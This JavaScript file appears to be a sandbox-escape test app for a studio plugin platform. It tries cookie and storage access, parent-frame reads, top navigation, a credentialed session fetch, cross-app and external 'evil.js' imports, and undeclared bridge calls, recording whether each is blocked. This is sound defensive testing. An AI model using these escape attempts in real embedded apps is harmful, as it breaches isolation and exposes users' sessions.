// A hostile test app (MVP-3 DoD 5 and 6). It declares only studio.aas.read,
// tries to break out of its sandbox, and writes what happened into
// #results, where the end-to-end tests read it.
const results = {}
const violations = []
document.addEventListener('securitypolicyviolation', event => violations.push(event.effectiveDirective))

const studioOrigin = location.ancestorOrigins?.[0] ?? null
const ownBase = new URL('../', import.meta.url).href

async function attempt (name, action) {
  try {
    const value = await action()
    results[name] = value === undefined ? 'allowed' : value
  } catch (error) {
    results[name] = `blocked (${error?.name ?? 'Error'})`
  }
}

function settle (ms) {
  return new Promise(resolve => setTimeout(resolve, ms))
}

// Studio's bridge, without the SDK.
let connects = 0
const connected = new Promise(resolve => {
  addEventListener('message', event => {
    if (event.source === parent && event.data?.type === 'connect' && event.ports[0]) {
      connects++
      resolve(event.ports[0])
    }
  })
})
parent.postMessage({ protocol: 'studio-sdk/0', type: 'hello' }, '*')
const port = await connected
port.start()
let nextId = 1
function call (method, params) {
  const id = nextId++
  return new Promise(resolve => {
    port.addEventListener('message', function listener (event) {
      if (event.data?.id === id) {
        port.removeEventListener('message', listener)
        resolve(event.data)
      }
    })
    port.postMessage({ type: 'request', id, method, params })
  })
}

await attempt('cookies', () => document.cookie === '' ? 'empty' : document.cookie)
await attempt('localStorage', () => localStorage.length)
await attempt('indexedDB', () => new Promise((resolve, reject) => {
  const request = indexedDB.open('probe')
  request.addEventListener('success', () => resolve('allowed'))
  request.addEventListener('error', () => reject(request.error))
}))
await attempt('parentDocument', () => parent.document.title)
await attempt('topNavigation', () => {
  top.location.href = 'https://example.com/'
})
await attempt('popup', () => window.open('https://example.com/') === null ? 'blocked (null)' : 'allowed')
await attempt('studioApi', async () => (await fetch(`${studioOrigin}/api/studio/v1/session`, { credentials: 'include' })).status)
await attempt('ownFile', async () => (await fetch(new URL('index.html', import.meta.url))).status)
// The same file in another installation: hosted /app/<other>/…, desktop studio-app://<other>/….
await attempt('foreignAppScript', () => import(`${ownBase.replace(/app-[\da-f]{16}/, 'app-0000000000000000')}ui/probe.js`))
await attempt('externalScript', () => import('https://example.com/evil.js'))
await attempt('embedStudio', async () => {
  const frame = document.createElement('iframe')
  frame.src = studioOrigin
  document.body.append(frame)
  await settle(500)
  return violations.includes('frame-src') ? 'blocked (frame-src)' : 'allowed'
})

// The bridge: another hello must not open a second channel, and requests
// posted to the parent window instead of the port are ignored.
parent.postMessage({ protocol: 'studio-sdk/0', type: 'hello' }, '*')
parent.postMessage({ type: 'request', id: 999, method: 'studio.aas.listShells', params: {} }, '*')
await settle(600)
results.secondConnect = connects === 1 ? 'refused' : 'allowed'

const read = await call('studio.aas.listShells', { limit: 1 })
results.declaredRead = read.type === 'response' ? 'allowed' : read.problem.code
const write = await call('studio.aas.setElementValue', { submodelId: 'urn:x', idShortPath: 'X', value: 'x', revision: 'h.x' })
results.undeclaredWrite = write.type === 'error' ? write.problem.code : 'allowed'
const notify = await call('studio.ui.notify', { message: 'hello' })
results.undeclaredNotify = notify.type === 'error' ? notify.problem.code : 'allowed'
const unknown = await call('studio.files.read', {})
results.unknownMethod = unknown.type === 'error' ? unknown.problem.code : 'allowed'

results.violations = [...new Set(violations)].toSorted()
document.querySelector('#results').textContent = JSON.stringify(results, null, 2)
document.body.dataset.done = 'true'
